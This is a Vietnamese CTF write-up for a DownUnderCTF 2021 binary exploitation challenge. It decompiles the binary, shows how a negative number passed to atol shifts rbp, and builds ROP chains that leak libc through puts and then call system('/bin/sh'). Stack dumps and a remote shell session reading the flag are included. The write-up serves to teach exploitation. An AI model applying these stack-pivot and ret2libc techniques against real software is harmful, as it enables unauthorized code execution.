# Phân tích file

```python
rbp: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=1c79065e901bfd5ae362acb59b1903f9ed4be249, for GNU/Linux 4.4.0, not stripped
```

```python
		Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

# Reverse file

- Main
    
    ```python
    int __cdecl main(int argc, const char **argv, const char **envp)
    {
      char buf[32]; // [rsp+0h] [rbp-20h] BYREF
    
      init(argc, argv, envp);
      printf("Hi there! What is your name? ");
      read(0, buf, 0x18uLL);
      puts("That is an interesting name.");
      printf("Do you have a favourite number? ");
      read_long();
      return 0;
    ```
    
    - Hàm chỉ cho ta nhập được 0x18(24 bytes).
- Read_long
    
    ```python
    __int64 read_long()
    {
      char buf[32]; // [rsp+0h] [rbp-20h] BYREF
    
      read(0, buf, 0x13uLL);
      return atol(buf);
    }
    ```
    
    - Hàm atol sẽ chuyển một chuỗi thành 1 số long int, nếu ta nhập vào 1 số âm thì nó vẫn nhận kết hợp với đoạn cuối của main ta có thể control được rbp ⇒ control được ret.
        
        ```python
        0x000000000040123e <main+105>:   add    rbp,rax
        ```
        

# Exploit

- Do ta có thể control được ret nên ta có thể cho ret trở về lần input của ta, nhưng input đầu tiên chỉ cho ta nhập 0x18 bytes không đủ để leak libc và quay về, nhưng ta có thể control rbp nên ta sẽ setup như sau:
- Ở lần nhập đầu tiên ta nhập main+ret+main
    
    ```python
    0x7fffffffe010: 0x00000000004011d5      0x000000000040101a
    0x7fffffffe020: 0x00000000004011d5
    ```
    
- Sau đó control rbp quay về ret và sẽ về lại main, sau đó ở lần nhập tiếp theo ta nhập pop_rdi + got.puts+plt.puts lúc này stack sẽ như sau:
    
    ```python
    0x7fffffffe000 —▸ 0x4012b3 (__libc_csu_init+99) ◂— pop    rdi
    01:0008│          0x7fffffffe008 —▸ 0x404018 (puts@got.plt) —▸ 0x7ffff7e4e5a0 (puts) ◂— endbr64
    02:0010│          0x7fffffffe010 —▸ 0x401030 (puts@plt) ◂— jmp    qword ptr [rip + 0x2fe2]
    03:0018│          0x7fffffffe018 —▸ 0x40101a (_init+26) ◂— ret
    04:0020│ rbp      0x7fffffffe020 —▸ 0x4011d5 (main) ◂— push   rbp
    ```
    
- Vậy là ta setup xong để leak libc và quay lại được main, giờ ta nhập atol(-40) để quay về pop_rdi và leak.
    
    ```python
    puts: 0x7ffff7e4e5a0
    base: 0x7ffff7dcdbd0
    ```
    
- Tương tự ta nhập input pop_rdi+bin_sh+system, stack như sau:
    
    ```python
    00:0000│ rsi rsp  0x7fffffffe000 —▸ 0x4012b3 (__libc_csu_init+99) ◂— pop    rdi
    01:0008│          0x7fffffffe008 —▸ 0x7ffff7f7e5aa ◂— 0x68732f6e69622f /* '/bin/sh' */
    02:0010│          0x7fffffffe010 —▸ 0x7ffff7e1c410 (system) ◂— endbr64
    03:0018│          0x7fffffffe018 —▸ 0x40101a (_init+26) ◂— ret
    04:0020│ rbp      0x7fffffffe020 —▸ 0x40123e (main+105) ◂— add    rbp, rax
    ```
    
- Tương tự nhập atol(-40) để quay về pop_rdi và lên shell.

```python
[+] Opening connection to pwn-2021.duc.tf on port 31910: Done
puts: 0x7fdf38de29d0
base: 0x7fdf38d62000
[*] Switching to interactive mode
That is an interesting name.
Do you have a favourite number? $ cat flag.txt
DUCTF{n0_0verfl0w?_n0_pr0bl3m!}
$
```
